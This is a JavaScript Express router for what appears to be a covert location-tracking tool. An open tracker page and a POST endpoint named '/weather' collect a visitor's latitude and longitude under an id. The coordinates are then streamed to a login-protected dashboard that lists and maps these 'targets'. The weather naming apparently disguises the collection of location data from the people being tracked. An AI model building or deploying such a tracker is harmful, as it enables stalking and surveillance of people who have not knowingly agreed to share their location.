const express = require("express");
const router = express.Router();
const config = require("./config");
const path = require("path");
const fs = require("fs");

const WEB_DIR = path.resolve(__dirname, "..", "web");

function webFile(name) {
  return path.join(WEB_DIR, name);
}

function sendWebFile(res, name, vars = {}) {
  const file = webFile(name);
  if (!fs.existsSync(file)) {
    return res.status(404).send("Page not found");
  }
  let html = fs.readFileSync(file, "utf-8");
  if (Object.keys(vars).length > 0) {
    html = html.replace(/<\/head>/i, () => {
      const lines = Object.entries(vars)
        .map(([k, v]) => {
          const safe = typeof v === "string" ? JSON.stringify(v) : JSON.stringify(v);
          return `<script>window.${k} = ${safe};</script>`;
        })
        .join("\n");
      return `${lines}\n</head>`;
    });
  }
  res.setHeader("Cache-Control", "no-store");
  res.type("html").send(html);
}

function checkToken(req, res, next) {
  const token = req.cookies.token;
  if (token != null && token === config.auth.token) {
    return next();
  }
  res.clearCookie("token").redirect("/login.html");
}

router.get(["/", "/index.html"], checkToken, (req, res) => {
  const baseURL = `${req.protocol}://${req.get("host")}`;
  sendWebFile(res, "index.html", {
    initialTargets: global.targets || {},
    baseURL: baseURL,
  });
});

router.get("/dashboard", (req, res) => res.redirect("/"));

router
  .route("/login")
  .get((req, res) => {
    if (req.cookies.token === config.auth.token) {
      return res.redirect("/");
    }
    res.redirect("/login.html");
  })
  .post((req, res) => {
    const { username, password } = req.body;
    if (config.auth.username === username && config.auth.password === password) {
      res.cookie("token", config.auth.token, {
        maxAge: config.auth.cookieMaxAge,
        httpOnly: true,
        sameSite: "lax",
      });
      return res.redirect("/");
    }
    const file = webFile("login.html");
    let html = fs.readFileSync(file, "utf-8");
    html = html.replace(
      "</head>",
      `<script>window.LOGIN_ERROR = "Invalid username or password";</script>\n</head>`
    );
    res.status(401).type("html").send(html);
  });

router.get("/logout", (req, res) => {
  res.clearCookie("token").redirect("/login.html");
});

router.get("/login.html", (req, res) => {
  if (req.cookies.token === config.auth.token) {
    return res.redirect("/");
  }
  sendWebFile(res, "login.html");
});

router.get("/tracker.html", (req, res) => {
  sendWebFile(res, "tracker.html", {
    baseURL: `${req.protocol}://${req.get("host")}`,
  });
});

router.get("/map.html", checkToken, (req, res) => {
  const { id } = req.query;
  if (!id) return res.redirect("/");
  const coords = global.targets && global.targets[id] ? global.targets[id] : null;
  sendWebFile(res, "map.html", {
    targetId: id,
    initialCoords: coords,
  });
});

router.get("/map", checkToken, (req, res) => {
  const { id } = req.query;
  res.redirect(id ? `/map.html?id=${encodeURIComponent(id)}` : "/");
});

router
  .route("/weather")
  .get((req, res) => {
    res.redirect("/tracker.html");
  })
  .post((req, res) => {
    const { id, lat, lng } = req.body;
    if (!id || lat == null || lng == null) {
      return res.status(400).json({ error: "Missing required fields" });
    }
    const isNew = global.targets[id] == null;
    global.targets[id] = [parseFloat(lat), parseFloat(lng)];
    global.targetLastSeen[id] = Date.now();
    if (isNew) {
      global.IO.emit("user-connected", id);
    }
    global.IO.emit("map-data", {
      id,
      lat: parseFloat(lat),
      lng: parseFloat(lng),
      timestamp: global.targetLastSeen[id],
    });
    console.log(`📍 [${new Date().toLocaleTimeString()}] ${id} → (${lat}, ${lng})`);
    res.json({ success: true });
  });

router.get("/api/targets", checkToken, (req, res) => {
  res.json({
    targets: global.targets,
    lastSeen: global.targetLastSeen,
  });
});

router.get("/api/targets/:id", checkToken, (req, res) => {
  const { id } = req.params;
  if (!global.targets[id]) {
    return res.status(404).json({ error: "Target not found" });
  }
  res.json({
    id,
    coords: global.targets[id],
    lastSeen: global.targetLastSeen[id],
  });
});

router.get("/healthz", (req, res) => {
  res.json({ ok: true, uptime: process.uptime(), targets: Object.keys(global.targets || {}).length });
});

module.exports = router;
